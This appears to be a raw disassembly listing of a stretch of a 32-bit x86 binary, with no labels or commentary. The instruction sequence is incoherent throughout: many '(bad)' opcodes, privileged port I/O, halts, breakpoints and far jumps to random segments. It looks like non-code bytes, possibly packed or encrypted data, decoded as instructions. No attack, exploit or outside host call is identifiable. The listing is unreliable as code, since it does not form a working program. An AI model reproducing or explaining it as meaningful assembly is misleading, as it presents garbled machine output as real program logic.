  41edcf:	push   cs
  41edd0:	addr16 retf 
  41edd2:	and    al,0xdf
  41edd4:	in     al,0x1f
  41edd6:	int    0x1c
  41edd8:	pslld  mm5,QWORD PTR [edx+edx*8+0x17663136]
  41ede0:	cdq    
  41ede1:	scas   eax,DWORD PTR es:[edi]
  41ede2:	dec    edi
  41ede3:	mov    al,ds:0x48968273
  41ede8:	push   ds
  41ede9:	mov    ds:0xb144bf3d,eax
  41edee:	cmp    eax,0xe45bf777
  41edf3:	ja     0x41ee62
  41edf5:	fsub   QWORD PTR [ecx+0x2c]
  41edf8:	push   esp
  41edf9:	out    dx,eax
  41edfa:	mov    cl,0x12
  41edfc:	fidiv  DWORD PTR [ebp+0x6136ad4e]
  41ee02:	jbe    0x41ee78
  41ee04:	addr16 ret 
  41ee06:	mov    dl,0x5b
  41ee08:	mov    esp,0xb62b0114
  41ee0d:	in     al,dx
  41ee0e:	mov    dh,0xed
  41ee10:	xchg   edx,eax
  41ee11:	ror    BYTE PTR [ebx-0x64a8d06c],0x5e
  41ee18:	cwde   
  41ee19:	lahf   
  41ee1a:	icebp  
  41ee1b:	pop    eax
  41ee1c:	repnz sti 
  41ee1e:	cmp    eax,0x3842e444
  41ee23:	xor    ebp,esi
  41ee25:	test   bh,0xde
  41ee28:	cmp    eax,0xccd66ab3
  41ee2d:	(bad)  [eax+0x12]
  41ee30:	dec    esp
  41ee31:	in     eax,dx
  41ee32:	inc    ebp
  41ee33:	xchg   edx,eax
  41ee34:	mov    cl,0xb0
  41ee36:	cmp    DWORD PTR [ebx],esi
  41ee38:	pop    esp
  41ee39:	cld    
  41ee3a:	mov    ecx,DWORD PTR [ebp+0x25941fd]
  41ee40:	xchg   ebx,eax
  41ee41:	hlt    
  41ee42:	ror    DWORD PTR [ebx+0x3e028c7],cl
  41ee48:	out    dx,eax
  41ee49:	mov    esp,0x3a6407da
  41ee4e:	jp     0x41ee34
  41ee50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee51:	shr    BYTE PTR [edx+0x39],0x1a
  41ee55:	jno    0x41eecb
  41ee57:	pop    ss
  41ee58:	xor    dh,BYTE PTR [ebp-0x790bc4e1]
  41ee5e:	fst    DWORD PTR [edi-0x400c931e]
  41ee64:	fwait
  41ee65:	jecxz  0x41ee54
  41ee67:	outs   dx,DWORD PTR ds:[esi]
  41ee68:	test   DWORD PTR [esi+0x4c8dfcb0],ecx
  41ee6e:	xor    DWORD PTR [edx-0x70],0xfffffff6
  41ee72:	int    0x6b
  41ee74:	pushf  
  41ee75:	repz add al,0x8
  41ee78:	rcr    BYTE PTR [edi],cl
  41ee7a:	sub    al,0xca
  41ee7c:	je     0x41ee99
  41ee7e:	(bad)  
  41ee7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee80:	inc    edi
  41ee81:	pusha  
  41ee82:	scas   eax,DWORD PTR es:[edi]
  41ee83:	fs mov ch,0x71
  41ee86:	inc    ecx
  41ee87:	mov    ds:0xdf068b1c,al
  41ee8c:	into   
  41ee8d:	pop    ds
  41ee8e:	ja     0x41eefe
  41ee90:	sub    eax,0x360f8b49
  41ee95:	cmp    bh,BYTE PTR [ecx*8+0x1dc8dc8b]
  41ee9c:	push   ecx
  41ee9d:	(bad)  
  41ee9e:	ja     0x41eeca
  41eea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eea1:	pop    esp
  41eea2:	cmp    ebx,ebp
  41eea4:	add    eax,0xcfa1e918
  41eea9:	jecxz  0x41eed5
  41eeab:	cmp    esp,ebx
  41eead:	mov    ch,0xab
  41eeaf:	hlt    
  41eeb0:	mov    es,WORD PTR [esi-0x49]
  41eeb3:	repz (bad)
  41eeb7:	je     0x41eec4
  41eeb9:	pushf  
  41eeba:	mov    ds:0x285eb585,al
  41eebf:	mov    bh,0x8f
  41eec1:	push   0xdd35900c
  41eec6:	sbb    cl,BYTE PTR [esp+eiz*2]
  41eec9:	xor    al,0xa2
  41eecb:	push   0xffffff88
  41eecd:	loope  0x41eece
  41eecf:	mov    bh,al
  41eed1:	lods   eax,DWORD PTR ds:[esi]
  41eed2:	mov    cl,0x8f
  41eed4:	sbb    al,bl
  41eed6:	jl     0x41eec9
  41eed8:	jno    0x41eef5
  41eeda:	pusha  
  41eedb:	lods   eax,DWORD PTR ds:[esi]
  41eedc:	fwait
  41eedd:	(bad)  
  41eedf:	hlt    
  41eee0:	mov    ds:0xc194cd37,al
  41eee5:	lahf   
  41eee6:	pop    es
  41eee7:	jno    0x41eecd
  41eee9:	sbb    dh,BYTE PTR [eax+0x1f535054]
  41eeef:	inc    ebx
  41eef0:	push   ecx
  41eef1:	xchg   edi,eax
  41eef2:	dec    edx
  41eef3:	popa   
  41eef4:	inc    ebx
  41eef5:	jnp    0x41ee90
  41eef7:	pop    esi
  41eef8:	adc    al,0xc8
  41eefa:	pop    ecx
  41eefb:	outs   dx,BYTE PTR ds:[esi]
  41eefc:	pop    esp
  41eefd:	or     bh,cl
  41eeff:	bound  edi,QWORD PTR [esp+ebx*4-0x23c96431]
  41ef06:	sti    
  41ef07:	adc    eax,0x42115ed8
  41ef0c:	xor    eax,0xe8e27c8c
  41ef11:	xlat   BYTE PTR ds:[ebx]
  41ef12:	ret    0xf54b
  41ef15:	adc    edx,edx
  41ef17:	sbb    dh,BYTE PTR ds:0x54387531
  41ef1d:	jbe    0x41ef70
  41ef1f:	xchg   esp,eax
  41ef20:	jecxz  0x41eefb
  41ef22:	push   es
  41ef23:	dec    eax
  41ef24:	aas    
  41ef25:	sbb    ah,BYTE PTR [ebp-0x3d]
  41ef28:	int    0xe3
  41ef2a:	fdivr  DWORD PTR [edi+eax*8+0x1bf75dea]
  41ef31:	push   es
  41ef32:	mov    dh,BYTE PTR [edx+ebx*1]
  41ef35:	pop    ds
  41ef36:	fdiv   QWORD PTR [edi]
  41ef38:	xchg   ecx,eax
  41ef39:	mov    al,cl
  41ef3b:	icebp  
  41ef3c:	sti    
  41ef3d:	je     0x41ef48
  41ef3f:	scas   eax,DWORD PTR es:[edi]
  41ef40:	(bad)  
  41ef41:	mov    dl,0x64
  41ef43:	push   es
  41ef44:	mov    esi,0x79a14cf3
  41ef49:	retf   
  41ef4a:	imul   eax,DWORD PTR ss:[edx-0x45],0x77087ef2
  41ef52:	loop   0x41ef94
  41ef54:	hlt    
  41ef55:	jnp    0x41ef4b
  41ef57:	fmul   QWORD PTR [edi+0x2e1b91a3]
  41ef5d:	aas    
  41ef5e:	dec    ecx
  41ef5f:	xchg   esi,eax
  41ef60:	leave  
  41ef61:	cmp    BYTE PTR [eax+0x3c3ed1b1],bl
  41ef67:	dec    esi
  41ef68:	dec    eax
  41ef69:	stos   DWORD PTR es:[edi],eax
  41ef6a:	daa    
  41ef6b:	mov    ah,BYTE PTR [esi+0x5dce04a5]
  41ef71:	mov    ds:0xb9447e34,eax
  41ef76:	adc    BYTE PTR [esi],cl
  41ef78:	xor    dl,BYTE PTR [ebp+eax*8-0x74]
  41ef7c:	inc    ebp
  41ef7d:	rcl    BYTE PTR [esi+edi*2],1
  41ef80:	sbb    al,0xe4
  41ef82:	xchg   dl,dh
  41ef84:	ret    0x87f7
  41ef87:	add    esp,DWORD PTR [edi-0x3b5bc5f9]
  41ef8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef8e:	add    eax,0xda1a432e
  41ef93:	sar    ah,cl
  41ef95:	sub    dl,BYTE PTR [edx]
  41ef97:	pop    ebp
  41ef98:	sub    ecx,edi
  41ef9a:	push   0x6
  41ef9c:	cmp    eax,0xd1c3ac98
  41efa1:	pop    ebp
  41efa2:	lds    ebp,FWORD PTR [esi+0x4f]
  41efa5:	mov    dl,0xc8
  41efa7:	sbb    BYTE PTR [ebp+0x153105b6],bl
  41efad:	or     BYTE PTR [ebp+edx*2+0x24],0xed
  41efb2:	sahf   
  41efb3:	mov    edx,0x8abe3dcb
  41efb8:	pushf  
  41efb9:	push   es
  41efba:	sub    dh,BYTE PTR [ebx-0x57]
  41efbd:	add    esi,ecx
  41efbf:	lods   eax,DWORD PTR ds:[esi]
  41efc0:	and    BYTE PTR [esi+0x65429351],0x17
  41efc7:	adc    al,0xf8
  41efc9:	push   edx
  41efca:	in     eax,dx
  41efcb:	fidiv  WORD PTR [edi]
  41efcd:	jmp    0x77689ddf
  41efd2:	jbe    0x41f010
  41efd4:	lea    esp,ds:0xcd1c5d5f
  41efda:	inc    ecx
  41efdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efdc:	push   edx
  41efdd:	in     eax,0xa6
  41efdf:	test   al,0xf
  41efe1:	out    dx,al
  41efe2:	test   BYTE PTR [ebx+0x72aeb7a5],cl
  41efe8:	mov    ecx,0xd352f3c1
  41efed:	ins    BYTE PTR es:[edi],dx
  41efee:	push   cs
  41efef:	stos   BYTE PTR es:[edi],al
  41eff0:	mov    bh,0xa2
  41eff2:	out    dx,al
  41eff3:	ret    0x2946
  41eff6:	mov    bh,0x89
  41eff8:	test   BYTE PTR [ebx+0x37d79dd3],bl
  41effe:	aad    0x46
  41f000:	mov    eax,0xa278d9ab
  41f005:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f006:	mov    ch,0x3
  41f008:	sbb    ch,BYTE PTR [ebx+ecx*4+0x3a]
  41f00c:	and    BYTE PTR [esi+eiz*1+0x42805f94],dh
  41f013:	jmp    0x5d30:0xae311830
  41f01a:	je     0x41efaf
  41f01c:	rcl    DWORD PTR [edx-0x52c7b98f],cl
  41f022:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f023:	add    DWORD PTR [ecx+0x15],edi
  41f026:	sbb    DWORD PTR [esi-0x63326416],0x8d95aae3
  41f030:	jg     0x41f00a
  41f032:	les    ebp,FWORD PTR ds:0x6db4eff
  41f038:	jns    0x41f069
  41f03a:	pop    ds
  41f03b:	out    dx,eax
  41f03c:	xor    BYTE PTR [esi-0x5ff21ea1],bl
  41f042:	(bad)  
  41f043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f044:	xchg   esp,eax
  41f045:	jns    0x41f06d
  41f047:	jae    0x41f06f
  41f049:	xchg   DWORD PTR [esi-0x29],edi
  41f04c:	rol    DWORD PTR [ecx],0x7f
  41f04f:	and    cl,dh
  41f051:	xchg   edx,eax
  41f052:	add    eax,0x434e0f68
  41f057:	mov    dh,0xd5
  41f059:	push   edi
  41f05a:	mov    bl,0x56
  41f05c:	das    
  41f05d:	and    edi,edx
  41f05f:	inc    ebp
  41f060:	dec    esi
  41f061:	(bad)  
  41f063:	ret    0x5993
  41f066:	or     esp,DWORD PTR [eax+0x5c]
  41f069:	cmc    
  41f06a:	adc    al,0xb6
  41f06c:	mov    ?,ecx
  41f06e:	fist   WORD PTR [ebx]
  41f070:	push   edx
  41f071:	jnp    0x41f0ad
  41f073:	stc    
  41f074:	sbb    cl,ch
  41f076:	adc    BYTE PTR [ebx],dh
  41f078:	das    
  41f079:	adc    dl,BYTE PTR [edi+0x1547697b]
  41f07f:	cmp    DWORD PTR [eax],esi
  41f081:	aad    0xcb
  41f083:	mov    ds:0xe25610c,eax
  41f088:	mov    eax,ds:0x22582b79
  41f08d:	stos   BYTE PTR es:[edi],al
  41f08e:	fs fwait
  41f090:	jmp    0x8d38:0x67ddcbda
  41f097:	dec    esp
  41f098:	pusha  
  41f099:	test   DWORD PTR [edi],edx
  41f09b:	bound  edx,QWORD PTR [esi]
  41f09d:	into   
  41f09e:	int    0xcc
  41f0a0:	retf   0xf06b
  41f0a3:	adc    BYTE PTR [esi-0xa7a1516],bl
  41f0a9:	icebp  
  41f0aa:	sub    ebx,DWORD PTR [ecx]
  41f0ac:	not    DWORD PTR [esi-0x3a]
  41f0af:	test   al,0xef
  41f0b1:	in     eax,dx
  41f0b2:	arpl   WORD PTR [esi+0x2c],cx
  41f0b5:	add    DWORD PTR [ebx+esi*1-0x3],edx
  41f0b9:	ja     0x41f0f1
  41f0bb:	and    esp,esi
  41f0bd:	cld    
  41f0be:	mov    edi,0x88fc9a28
  41f0c3:	xchg   DWORD PTR [ebx-0x7c],ebx
  41f0c6:	add    edi,ebp
  41f0c8:	and    eax,0x7bcebfb1
  41f0cd:	mov    ah,BYTE PTR [ecx+0x79ec259a]
  41f0d3:	fstp   QWORD PTR [edi]
  41f0d5:	pushf  
  41f0d6:	popa   
  41f0d7:	js     0x41f07f
  41f0d9:	sbb    ebp,esi
  41f0db:	mov    ecx,0xfdd421cd
  41f0e0:	in     al,dx
  41f0e1:	(bad)  
  41f0e2:	jbe    0x41f0cd
  41f0e4:	mov    ds:0x80c9388b,al
  41f0e9:	sbb    ch,dl
  41f0eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0ec:	nop
  41f0ed:	nop
  41f0ee:	ins    DWORD PTR es:[edi],dx
  41f0ef:	dec    esi
  41f0f0:	fcmovne st,st(6)
  41f0f2:	xor    eax,0x762f2f2c
  41f0f7:	imul   esp,DWORD PTR [ebx],0xffffffc1
  41f0fa:	jmp    0x41f157
  41f0fc:	pop    edi
  41f0fd:	rol    BYTE PTR [esi],cl
  41f0ff:	sub    al,0x4f
  41f101:	icebp  
  41f102:	out    dx,eax
  41f103:	sub    al,0xff
  41f106:	jl     0x41f12a
  41f108:	rcl    DWORD PTR [ecx+0x64a11175],0xdd
  41f10f:	(bad)  
  41f110:	xchg   edi,eax
  41f111:	mov    ss,WORD PTR [ebp+0x33]
  41f114:	mov    ah,0xd0
  41f116:	call   0xdf1d:0x545a4ee8
  41f11d:	mov    BYTE PTR [edi],cl
  41f11f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f120:	popa   
  41f121:	(bad)  
  41f122:	(bad)  
  41f124:	dec    esi
  41f125:	ror    bl,0x1f
  41f128:	imul   esi,esp,0x6b712cc6
  41f12e:	lods   eax,DWORD PTR ds:[esi]
  41f12f:	mov    edi,0x696710aa
  41f134:	stos   DWORD PTR es:[edi],eax
  41f135:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f136:	pusha  
  41f137:	ins    DWORD PTR es:[edi],dx
  41f138:	inc    bl
  41f13a:	xchg   ebx,eax
  41f13b:	icebp  
  41f13c:	push   esi
  41f13d:	xchg   ebp,eax
  41f13e:	scas   al,BYTE PTR es:[edi]
  41f13f:	lahf   
  41f140:	mov    dh,ch
  41f142:	xchg   ebp,eax
  41f143:	mov    ecx,0x6aad457f
  41f148:	cmp    ch,dl
  41f14a:	loope  0x41f10d
  41f14c:	fcmovbe st,st(3)
  41f14e:	out    0x2,eax
  41f150:	rcl    DWORD PTR [ecx+0x1b],1
  41f153:	in     eax,dx
  41f154:	inc    edi
  41f155:	jns    0x41f12c
  41f157:	mov    eax,ds:0xd2e0e10f
  41f15c:	stc    
  41f15d:	fmul   st,st(7)
  41f15f:	jl     0x41f125
  41f161:	sub    dh,BYTE PTR [ecx-0x2c]
  41f164:	arpl   WORD PTR [ebx+0x7a],si
  41f167:	(bad)  
  41f168:	sbb    eax,0xe3f03209
  41f16d:	imul   esp,DWORD PTR [ebx+0x27],0x31ea6717
  41f174:	cmp    BYTE PTR [ebp+0x7c5758ac],0xa1
  41f17b:	sbb    esp,DWORD PTR [eax-0x55]
  41f17e:	push   eax
  41f17f:	shl    ah,1
  41f181:	xlat   BYTE PTR ds:[ebx]
  41f182:	out    0x5a,al
  41f184:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f185:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f186:	inc    eax
  41f187:	dec    edx
  41f188:	out    0x4f,al
  41f18a:	sub    ah,BYTE PTR [ebx-0x1f575cf]
  41f190:	(bad)  
  41f191:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f192:	pop    ds
  41f193:	iret   
  41f194:	popa   
  41f195:	and    dl,BYTE PTR [edi+0x2f898955]
  41f19b:	mov    esp,0xed0bd05d
  41f1a0:	lods   al,BYTE PTR ds:[esi]
  41f1a1:	dec    edi
  41f1a2:	nop
  41f1a3:	jae    0x41f205
  41f1a5:	mov    ah,BYTE PTR [ecx-0x38504aa9]
  41f1ab:	push   ebp
  41f1ac:	xchg   ebx,eax
  41f1ad:	pop    ebp
  41f1ae:	aas    
  41f1af:	into   
  41f1b0:	inc    ecx
  41f1b1:	imul   eax,DWORD PTR [edi-0x3d077da7],0xcb0c52ff
  41f1bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1bc:	test   dl,bh
  41f1be:	iret   
  41f1bf:	call   0x51f8b139
  41f1c4:	lods   eax,DWORD PTR ds:[esi]
  41f1c5:	and    BYTE PTR [edx+0x36],0x2f
  41f1c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1ca:	jbe    0x41f173
  41f1cc:	(bad)  
  41f1cd:	mov    dh,0x24
  41f1cf:	jg     0x41f1c7
  41f1d1:	dec    ebp
  41f1d2:	iret   
  41f1d3:	daa    
  41f1d4:	mov    ah,0xce
  41f1d6:	mul    BYTE PTR [ebp-0x6c8fe971]
  41f1dc:	stos   DWORD PTR es:[edi],eax
  41f1dd:	outs   dx,BYTE PTR ds:[esi]
  41f1de:	jmp    0x9802:0x8ed84510
  41f1e5:	sub    ax,0x181
  41f1e9:	pop    ecx
  41f1eb:	in     al,dx
  41f1ec:	inc    DWORD PTR [ebx]
  41f1ee:	xchg   ebp,eax
  41f1ef:	sub    cl,cl
  41f1f1:	cwde   
  41f1f2:	xor    dl,dh
  41f1f4:	iret   
  41f1f5:	shl    BYTE PTR [edi],1
  41f1f7:	cmp    ecx,DWORD PTR [edi+eax*1]
  41f1fa:	sub    BYTE PTR [edx+0x4097fc8c],bh
  41f200:	push   esp
  41f201:	lods   al,BYTE PTR ds:[esi]
  41f202:	in     al,dx
  41f203:	icebp  
  41f204:	pusha  
  41f205:	leave  
  41f206:	jmp    0x41f244
  41f208:	adc    ah,cl
  41f20a:	xor    DWORD PTR [edi-0x7],esi
  41f20d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f20e:	mov    bh,0xb1
  41f210:	fstp   DWORD PTR ds:0x9590d2cd
  41f216:	mov    ah,0x7
  41f219:	mov    esp,0x6cc9395a
  41f21e:	xor    al,0x42
  41f220:	cmc    
  41f221:	inc    ebp
  41f222:	push   ebp
  41f223:	and    DWORD PTR [ebx],ebp
  41f225:	pop    esp
  41f226:	jae    0x41f1f3
  41f228:	les    esi,FWORD PTR [ebx-0x67]
  41f22b:	fxch   st(7)
  41f22d:	xor    DWORD PTR [ecx+0x79876937],0xe5ea0f5b
  41f237:	fwait
  41f238:	cmc    
  41f239:	fmul   QWORD PTR [edx+0x343e6480]
  41f23f:	adc    ch,BYTE PTR [esi+0x5fd08912]
  41f245:	ins    DWORD PTR es:[edi],dx
  41f246:	inc    edi
  41f247:	jmp    0x3eaa9e7a
  41f24c:	loopne 0x41f1ef
  41f24e:	cmp    eax,0x8e39cf24
  41f253:	in     eax,dx
  41f254:	pop    ds
  41f255:	ins    DWORD PTR es:[edi],dx
  41f256:	push   esp
  41f257:	jp     0x41f1e0
  41f259:	out    0x1d,al
  41f25b:	add    esi,DWORD PTR [edi]
  41f25d:	pop    eax
  41f25e:	ror    BYTE PTR [ebp+0x12],1
  41f261:	in     al,dx
  41f262:	js     0x41f29a
  41f264:	enter  0xc7e4,0xc1
  41f268:	mov    bh,0xe5
  41f26a:	ror    DWORD PTR [ecx+0x2b],cl
  41f26d:	ss push ss
  41f26f:	scas   al,BYTE PTR es:[di]
  41f271:	and    al,0x1e
  41f273:	cmp    eax,0x9ea9680b
  41f278:	dec    ebp
  41f279:	xchg   edi,eax
  41f27a:	clc    
  41f27b:	arpl   bp,si
  41f27d:	lock sbb cl,BYTE PTR [ebx+0x3c9efbec]
  41f284:	jne    0x41f2d4
  41f286:	mov    ah,0xc
  41f288:	repnz mov sp,0x57ca
  41f28d:	xor    eax,0xb47b07b4
  41f292:	inc    esp
  41f293:	ret    
  41f294:	nop
  41f295:	ja     0x41f28c
  41f297:	cs (bad) 
  41f299:	call   0x930c:0x2c228469
  41f2a0:	ds nop
  41f2a2:	fcom   QWORD PTR [eax-0x604a3bec]
  41f2a8:	and    al,al
  41f2aa:	push   ss
  41f2ab:	mov    edi,0x1e484109
  41f2b0:	fld    TBYTE PTR [esi+eax*1-0x6ff10899]
  41f2b7:	or     ecx,edx
  41f2b9:	rol    DWORD PTR [esi+0x2a],1
  41f2bc:	scas   al,BYTE PTR es:[edi]
  41f2bd:	dec    edi
  41f2be:	add    ah,BYTE PTR [esi-0x454fe867]
  41f2c4:	lock scas eax,DWORD PTR es:[edi]
  41f2c6:	mov    bl,0xaa
  41f2c8:	mov    ch,0x48
  41f2ca:	sbb    ebp,DWORD PTR [ebp+0x993c296]
  41f2d0:	stos   BYTE PTR es:[edi],al
  41f2d1:	sub    dh,ch
  41f2d3:	lahf   
  41f2d4:	push   edi
  41f2d5:	pop    edi
  41f2d6:	out    dx,al
  41f2d7:	adc    eax,0x4d57e9bb
  41f2dc:	dec    eax
  41f2dd:	test   DWORD PTR [edx-0x55],edi
  41f2e0:	ja     0x41f31e
  41f2e2:	pop    ecx
  41f2e3:	inc    esi
  41f2e4:	bnd jmp 0x41f35d
  41f2e7:	adc    dh,BYTE PTR [ebp-0x12]
  41f2ea:	sub    bh,ch
  41f2ec:	imul   ecx,DWORD PTR [eax+0x56],0x89a01033
  41f2f3:	mov    ebp,0xbfc98445
  41f2f8:	in     eax,dx
  41f2f9:	test   ch,dl
  41f2fb:	mov    edi,0x19fdf2fd
  41f300:	fst    QWORD PTR [ebp-0xe8f9cb1]
  41f306:	rcl    BYTE PTR [edi+esi*8],0x38
  41f30a:	mov    edx,0xa62e18aa
  41f30f:	jmp    0x41f2c5
  41f311:	repz cmp ebp,ebp
  41f314:	in     eax,dx
  41f315:	push   esi
  41f316:	retf   0xe3cc
  41f319:	daa    
  41f31a:	xchg   DWORD PTR [esp+edx*8-0x4],edx
  41f31e:	out    dx,eax
  41f31f:	dec    ecx
  41f320:	xor    BYTE PTR [eax-0x38],al
  41f323:	mov    ecx,0xebaa72a6
  41f328:	jno    0x41f340
  41f32a:	pop    edi
  41f32b:	cwde   
  41f32c:	ins    BYTE PTR es:[edi],dx
  41f32d:	fild   QWORD PTR [ebp-0x32]
  41f330:	mov    al,0xfe
  41f332:	out    0x9a,eax
  41f334:	hlt    
  41f335:	mov    ch,0x98
  41f337:	scas   eax,DWORD PTR es:[edi]
  41f338:	xchg   BYTE PTR [edi-0x3d],ah
  41f33b:	call   0x33f6:0x1f695e93
  41f342:	xor    al,0xce
  41f344:	cmp    DWORD PTR ds:0xd37bc600,ecx
  41f34a:	jae    0x41f38d
  41f34c:	mov    ebp,0xba921627
  41f351:	sbb    esi,eax
  41f353:	aas    
  41f354:	pop    esi
  41f355:	xor    BYTE PTR [esi+0x3ee2e761],ch
  41f35b:	(bad)  
  41f35c:	fidiv  DWORD PTR [esi]
  41f35e:	mov    edi,DWORD PTR [edx-0x31]
  41f361:	leave  
  41f362:	jmp    0xb7d9:0x5297aa21
  41f369:	or     bh,BYTE PTR [edx]
  41f36b:	pop    ss
  41f36c:	fwait
  41f36d:	jge    0x41f39b
  41f36f:	cmp    BYTE PTR [esi-0x28247644],cl
  41f375:	sub    edi,0x76bb0ee0
  41f37b:	(bad)  
  41f37c:	aam    0xb
  41f37e:	test   DWORD PTR [ebp+eax*4+0x0],esi
  41f382:	sub    al,0xe9
  41f384:	add    BYTE PTR [edx],cl
  41f386:	stos   BYTE PTR es:[edi],al
  41f387:	xchg   esi,eax
  41f388:	xchg   esp,eax
  41f389:	mov    ds:0x13610e86,eax
  41f38e:	lds    edx,FWORD PTR [edi-0x25]
  41f391:	shl    ch,cl
  41f393:	loope  0x41f326
  41f395:	add    esp,DWORD PTR [ebp-0x579c813f]
  41f39b:	xchg   ecx,eax
  41f39c:	sbb    edi,DWORD PTR [ecx+0x42]
  41f39f:	dec    ebx
  41f3a0:	cld    
  41f3a1:	adc    edx,esi
  41f3a3:	int3   
  41f3a4:	mov    esi,0xbd1c007e
  41f3a9:	popf   
  41f3aa:	push   0x22f8055f
  41f3af:	stos   BYTE PTR es:[edi],al
  41f3b0:	loopne 0x41f416
  41f3b2:	or     BYTE PTR [esi+esi*8],al
  41f3b5:	xor    eax,0x8a83918c
  41f3ba:	(bad)  
  41f3bb:	ja     0x41f3ff
  41f3bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3be:	lds    ecx,FWORD PTR [edx+edx*2]
  41f3c1:	mov    ecx,0x6d7a0c77
  41f3c6:	sub    bh,BYTE PTR [esi]
  41f3c8:	dec    edx
  41f3c9:	or     ebx,DWORD PTR [eax+0x65dbcfca]
  41f3cf:	test   DWORD PTR [edi+eax*8],ecx
  41f3d2:	pusha  
  41f3d3:	mov    DWORD PTR [ebp-0x6c7f64cd],0xa2d0b5a6
  41f3dd:	(bad)  
  41f3de:	imul   edi,DWORD PTR [eax],0x187e78dc
  41f3e4:	push   edi
  41f3e5:	push   esi
  41f3e6:	sub    eax,0xc6a4351e
  41f3eb:	sub    al,BYTE PTR [ebp-0x3e990d4]
  41f3f1:	or     DWORD PTR [eax-0x63e8c503],ebx
  41f3f7:	pop    ds
  41f3f8:	loop   0x41f466
  41f3fa:	push   ss
  41f3fb:	ret    0x674a
  41f3fe:	je     0x41f39a
  41f400:	and    eax,0xad156d01
  41f405:	mov    edi,0xe7f30c59
  41f40a:	add    cl,dl
  41f40c:	pop    ebp
  41f40d:	and    eax,0xbf97a302
  41f412:	(bad)  
  41f414:	xchg   ebx,eax
  41f415:	jmp    0x41f3ec
  41f417:	mov    DWORD PTR [edi+0x66580642],edi
  41f41d:	stos   DWORD PTR es:[edi],eax
  41f41e:	dec    ebx
  41f41f:	int    0x82
  41f421:	sbb    ax,0xe395
  41f425:	cmp    DWORD PTR [esi],esp
  41f427:	sbb    eax,0x9cd71238
  41f42c:	mov    esi,0xb0f65a63
  41f431:	or     bh,ah
  41f433:	add    ebx,DWORD PTR [edi]
  41f435:	(bad)  
  41f436:	push   ebx
  41f437:	and    al,0x75
  41f439:	jecxz  0x41f3cf
  41f43b:	lahf   
  41f43c:	mov    WORD PTR [esi+0x51156bee],ds
  41f442:	int3   
  41f443:	lods   al,BYTE PTR ds:[esi]
  41f444:	mov    esi,0x552fcc61
  41f449:	dec    esp
  41f44a:	mov    ch,0xf5
  41f44c:	mov    WORD PTR [esi+0x3d3788fa],fs
  41f452:	mov    dl,BYTE PTR [ecx+0x7e90f96b]
  41f458:	sub    al,dh
  41f45a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f45b:	add    eax,0xe9c3e98a
  41f460:	cdq    
  41f461:	xlat   BYTE PTR ds:[ebx]
  41f462:	xchg   ebp,eax
  41f463:	cwde   
  41f464:	sbb    dh,BYTE PTR [esi+eiz*2]
  41f467:	outs   dx,DWORD PTR ds:[esi]
  41f468:	inc    eax
  41f469:	mov    edx,DWORD PTR [esp+eax*1]
  41f46c:	lea    eax,[ecx]
  41f46e:	pusha  
  41f46f:	sub    DWORD PTR [ecx],esi
  41f471:	push   cs
  41f472:	sub    eax,0xe3b28222
  41f477:	xchg   esp,eax
  41f478:	mov    ecx,DWORD PTR [ecx-0x31328409]
  41f47e:	xor    DWORD PTR [ebx+0x4f],edi
  41f481:	jne    0x41f410
  41f483:	fldenv [ebx+0x2f]
  41f486:	ja     0x41f4cd
  41f488:	stos   DWORD PTR es:[di],eax
  41f48a:	nop
  41f48b:	ja     0x41f466
  41f48d:	push   ebp
  41f48e:	lods   eax,DWORD PTR ds:[esi]
  41f48f:	cmp    DWORD PTR [esi+ebp*4],ecx
  41f492:	(bad)  
  41f493:	add    DWORD PTR [esp+edx*4-0x1b],0x7bfd748a
  41f49b:	cmp    eax,0x397260a3
  41f4a0:	sub    DWORD PTR cs:[ebx],ebp
  41f4a3:	xchg   esp,eax
  41f4a4:	sbb    eax,DWORD PTR [ecx-0x38fb58d6]
  41f4aa:	push   0x64e38c8d
  41f4af:	push   esi
  41f4b0:	cmp    DWORD PTR [edi+0x57],edx
  41f4b3:	add    BYTE PTR [edi-0x4f],cl
  41f4b6:	jl     0x41f47f
  41f4b8:	pop    edx
  41f4b9:	inc    ebp
  41f4ba:	jp     0x41f4ca
  41f4bc:	cld    
  41f4bd:	fdiv   QWORD PTR [ebx]
  41f4bf:	(bad)  
  41f4c0:	pop    esi
  41f4c1:	rol    bl,0x12
  41f4c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4c5:	inc    edi
  41f4c6:	shl    esi,cl
  41f4c8:	dec    esp
  41f4c9:	scas   eax,DWORD PTR es:[edi]
  41f4ca:	mov    esp,0x8d5381f0
  41f4cf:	in     al,0xcd
  41f4d1:	(bad)  
  41f4d2:	(bad)  
  41f4d3:	and    ebx,edx
  41f4d5:	imul   sp,WORD PTR [ebx],0x577a
  41f4da:	xchg   edx,eax
  41f4db:	gs leave 
  41f4dd:	jmp    0xa2f1:0xfc51a0b
  41f4e4:	call   0x56fb:0xac1c5291
  41f4eb:	pop    esi
  41f4ec:	mov    ebx,0xdb81340d
  41f4f1:	dec    ecx
  41f4f2:	aaa    
  41f4f3:	inc    ebp
  41f4f4:	mov    ecx,0xfda44702
  41f4f9:	sbb    ecx,edi
  41f4fb:	inc    ebp
  41f4fc:	cmp    eax,esp
  41f4fe:	adc    BYTE PTR [esp+eiz*4+0x47],ah
  41f502:	cld    
  41f503:	lods   eax,DWORD PTR ds:[esi]
  41f504:	dec    ebp
  41f505:	cmc    
  41f506:	jg     0x41f4af
  41f508:	pop    edi
